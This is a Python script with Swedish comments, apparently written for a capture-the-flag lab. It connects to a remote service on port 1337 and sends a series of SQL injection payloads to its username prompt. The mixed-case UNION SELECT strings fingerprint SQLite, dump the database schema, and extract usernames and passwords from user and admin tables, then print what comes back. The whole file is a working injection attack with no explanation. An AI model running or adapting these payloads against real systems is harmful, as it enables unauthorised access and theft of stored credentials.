import socket
import time

HOST = '10.10.216.90'
PORT = 1337

payloads = [
    "' UniOn SeLeCt sqlite_version() '",
    "' UniOn SeLeCt group_concat(sql) FROM sqlite_master '",
    "' UniOn SeLeCt group_concat(username) FROM usertable '",
    "' UniOn SeLeCt group_concat(password) FROM usertable '",
    "' UniOn SeLeCt group_concat(username) FROM admintable '",
    "' UniOn SeLeCt group_concat(password) FROM admintable '"
]

def recv_until(sock, target="username", timeout=2):
    sock.settimeout(timeout)
    total_data = []
    try:
        while True:
            data = sock.recv(1024)
            if not data:
                break
            total_data.append(data.decode(errors='ignore'))
            if target in total_data[-1]:
                break
    except socket.timeout:
        pass
    return ''.join(total_data)

def talk_to_server(payload):
    try:
        s = socket.socket()
        s.connect((HOST, PORT))

        # Vänta in prompt
        response = recv_until(s, target="username")
        if "username" not in response.lower():
            print("⚠️  Ingen 'username'-prompt hittades!")
            return

        # Skicka payload
        s.sendall((payload + '\n').encode())
        time.sleep(0.5)

        # Läs svar (för "Password: ..." osv)
        output = recv_until(s, timeout=1.5)

        print(f"\n[🧪 PAYLOAD]: {payload}")
        print("[📤 OUTPUT]:")
        print(output.strip())

        s.close()

    except Exception as e:
        print(f"[❌ FEL]: {e}")

for p in payloads:
    talk_to_server(p)

